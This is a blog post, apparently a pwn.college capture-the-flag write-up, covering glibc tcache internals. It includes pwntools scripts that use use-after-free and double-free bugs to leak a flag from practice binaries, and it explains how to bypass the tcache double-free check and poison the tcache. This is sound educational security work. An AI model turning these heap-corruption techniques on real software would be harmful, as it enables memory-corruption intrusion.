---
layout: post
title:  "Pwn College - Tcache Exploitation"
date:   2024-05-20 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

Over the years, there were many heap exploitation techniques developed. Most of them can be found [here][heap-techniques] (there are other obscure techniques, not mentioned there). \
This module deals with a subset of techniques, only involving the tcache. 

## Background

One approach of dynamically allocating memory is `mmap`. While it does allows dynamic allocation and deallocation for regions that surivves across functions (unlike the stack), the allocation size is inflexible, and requires kernel involvment for every call. \
A smarter solution is to write a library, that allocates a large chunk of memory (`brk`, not `mmap`, but also allocates large amout of memory), and manage the small chunks of it, based on demand. 

Current dynamic allocator of Linux usermode is `ptmalloc2`, for its kernel - `kmalloc` (slab allocator), for FreeBSD it is `jemalloc` (which used in Android), for Windows - `Segment Heap, NT Heap`, for Chrome - `PartitionAlloc`. 

It is good to mention that the heap **HAVE NO RELATION** to the heap data structure. \
The heap provides the basic API of `malloc, free`, as well as more fancy stuff, such as `realloc, calloc` and others (`aligned_alloc`). 

Recall `ptmalloc` doesn't uses `mmap` but `brk`. \
`brk(addr)` expands the end of the data segment up to `addr`, while `sbrk(NULL)` returns the end, and `sbrk(delta)` increments the end by `delta` bytes. `ptmalloc` simply slices bytes off the data segment for small allocations, and uses `mmap` for very large allocations.

### Detection

We can detect some dynamic memory issues via `valgrind`. Also, glibc itself has some hardening techniques, in the cost of performance - `MALLOC_CHECK`, `MALLOC_PERTURB`, `MALLOC_MMAP_THRESHOLD` (making ALL allocations being done via `mmap`, lol). 

### Tcache

Thread Local Caching - feature of `ptmalloc` (and other popular allocators), to speed up repeated small allocations within a single thread. \
Implemented as singly-linked list. 
Notice there are separate tcache bins (linked lists) for every chunk sizes (by multiple of the alignment `0x10`). \
In each thread, theres one instance of `struct tcache_perthread_struct`, which tracks all various tcache bins heads (`tcache_entry *`), as well as the count of available chunks per bin. This is a readonly area. For fast accessing, this instance address resides at the second qword of data within every freed chunk (instead of `bk`). 

```c
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

typedef struct tcache_entry
{
    struct tcache_entry *next;
    struct tcache_perthread_struct *key;
} tcache_entry;
```

The last chunk within every bin (first freed chunk) contains its `next` set to `NULL`. \
Recall all allocated chunks contains metadata before them, of `0x10` bytes long (on 64-bit platforms). Moreover, allocations are always aligned to `0x10`. Hence, if we would allocate `0x1c` bytes (28 bytes), we would actually allocate chunk of size `align(0x2c,10) = 0x30` bytes. \
The chunk metadata contains its `size` and  `prev_size`, as well as `flags` (`PREV_INUSE, IS_MMAPPED, NON_MAIN_ARENA`). Notice `flags` are actually the lowest nibble within `size`, as the memory is aligned to `0x10`. An important bit is `PREV_INUSE`, which tracks whether or not the previous chunk is used (allocated). Its main usage is within consolidation of chunks, and **irrelevant** for tcache, which completely ignores this value. \
When chunk is freed, the `next` pointer is being updated to the previously head chunk. `next` is actually part of the data of a chunk, as it is now being un-used. For tcache, when something is freed, it is pushed to the HEAD of the list. 

Upon freeing, the right bin index is fetch based on the chunk size (which is part of the metadata). It checks for a double free, by naively inspecting the `key` offset of the chunk, and asserting it isn't equal to `tcache_perthread_struct` address. \
It then pushes the freed allocation as the head of the list, and updates `tache_perthread_struct`.  

For allocation, we simply calculate the correct bin index, checking the `tache_perthread_struct` count of that bin, and fetching the head of the bin. \
Notice that allocation does not clears all sensitive pointers (only `key`..), as well as doesn't verifies if the `next` address of the previously-head chunk makes sense. 

#### Double Free

In order to address double free, the `key` mitigation was added. The relevant error message of the check is `"double free detected in tcache 2"`, and the check being made is simply compare of `e->key == tcache` (if it holds, it means double free occured). \
Notice it handles the case of a coincidence, where the user data simply had the `tcache_perthread_struct` as its second qword data (it does so by traversing all chunks of that bin. If the chunk to be freed isn't there, it assumes it really is allocated). \
If we can write to the freed chunk, by simply overwriting the second qword to **any** other value that is not `tcache` value, we would be able to pass this check and perform another free! \
The double free gives us a strong primitive, where we can have multiple object instances pointing to the same underlying chunk (as 2 malloc calls would return the same address).

#### Tcache Poisoning

Corrupting `tcache_entry->next`. This means `malloc` would return address of our wish, upon allocation. Hence, a chunk to arbitrary address. \
This may be very usefull primitive to leverage towards arbitrary R/W. 

## Challenge 1

I've set `pwndbg` environment for all challenges from now on. Its heap commands documentation can be found [here][pwndbg-docs].

Upon launching the challenge, the heap is in the following state:

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x556060c7c000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x556060c7c290
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x556060c7c2b0
Size: 0x20d50 (with flag bits: 0x20d51)

pwndbg> bins
tcachebins
empty
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
empty

pwndbg> tcache
tcache is pointing to: 0x556060c7c010 for thread 1
{
  counts = {0 <repeats 64 times>},
  entries = {0x0 <repeats 64 times>}
}
```

Other useful commands may be `vis_heap_chunks` and `malloc_chunk`. 

Upon allocating the flag buffer via `read_flag`, it is being allocated off the `top_chunk` (can be seen via `heap`). Of course, the bins resides empty as this chunk isn't freed. 

We can exploit this challenge by creating a UAF - making the flag allocation to be performed off the tcache of size `0x250`, then calling `puts` on the freed slot:

```python
def malloc(p, size):
    p.sendline(b'malloc')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'quit): ')

def free(p):
    p.sendline(b'free')
    p.recvuntil(b'quit): ')

def exploit():    
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    size = 574
    malloc(p, size)
    free(p)
    p.sendline(b'read_flag')
    p.sendline(b'puts')
    
    p.interactive()
```

## Challenge 2

Now the allocation size is actually being randomized. \
My idea is to simply try all possible chunks allocation sizes, re-allocating the flag after each of them (so it would hopefully be allocated within the candidate bin) and try to leak the flag via `puts`.

```python
def read_flag(p):
    p.sendline(b'read_flag')
    p.recvuntil(b'quit): ')

def puts_flag(p):
    p.sendline(b'puts')
    output = p.recvuntil(b'quit): ')
    if b'pwn.college' in output:
        print(f'OUTPUT:{output}')
        exit(0)

def exploit():    
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    for size in range(0x10, 0x800, 0x10):
        print(f'Trying size:{size}')
        malloc(p, size)
        free(p)
        read_flag(p)
        puts_flag(p)
        
    p.interactive()
```

## Challenge 3

Now the flag buffer is actually being allocated twice before it is written. Hence, we'd like our target bin to contain 2 available chunks. 

```python
def malloc(p, index, size):
    p.sendline(b'malloc')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'quit): ')

def free(p, index):
    p.sendline(b'free')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'quit): ')

def read_flag(p):
    p.sendline(b'read_flag')
    p.recvuntil(b'quit): ')

def puts_flag(p, index):
    p.sendline(b'puts')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    output = p.recvuntil(b'quit): ')
    if b'pwn.college' in output:
        print(f'OUTPUT:{output}')
        exit(0)

def exploit():    
    debug = False
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    for size in range(0x10, 0x800, 0x10):
        print(f'Trying size:{size}')
        malloc(p, 0, size)
        malloc(p, 1, size)
        free(p, 0)
        free(p, 1)
        read_flag(p)
        puts_flag(p, 0)
        
    p.interactive()
```

## Challenge 4

This challenge can manage only up to 1 unique allocations. However, flag is being allcoated 2 times before it is used. \
This means we would like to populate its bin with 2 chunks. We can do so by exploiting double free on that chunk, which only requires writing SOMETHING to `tcache_entry.key`. 

```python
def scanf(p, buf):
    p.sendline(b'scanf')
    p.sendline(buf)
    p.recvuntil(b'quit): ')

def exploit():    
    debug = False
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    buf = b'A' * 8 + b'B'
    for size in range(0x10, 0x800, 0x10):
        print(f'Trying size:{size}')
        malloc(p, size)
        free(p)
        scanf(p, buf)
        free(p)
        read_flag(p)
        puts_flag(p)
        
    p.interactive()
```

Notice I've used linear heap overflow to the freed chunk, which overwrote both `next` and `key`. In that case, `next` was overwritten to `0x4141414141414141` and `key` LSB to `0x42` (and `0x0a` due newline..). \
The most interesting finding within this challenge, is the fact that upon triggering the second free, it actually "fixes" the overwritten `next` pointer is restored:

Before double free:

```bash
0x557495a182b0  0x0000000000000000      0x00000000000003b1      ................                                                                                                                                                                                   
0x557495a182c0  0x4141414141414141      0x0000557495a10042      AAAAAAAAB...tU..         <-- tcachebins[0x3b0][0/1]
```

After: 

```bash
0x557495a182b0  0x0000000000000000      0x00000000000003b1      ................
0x557495a182c0  0x0000557495a182c0      0x0000557495a18010      ....tU......tU..         <-- tcachebins[0x3b0][0/2], tcachebins[0x3b0][0/2]
```

## Challenge 5



[heap-techniques]: https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/
[pwndbg-docs]: https://browserpwndbg.readthedocs.io/en/docs/commands/heap/heap/
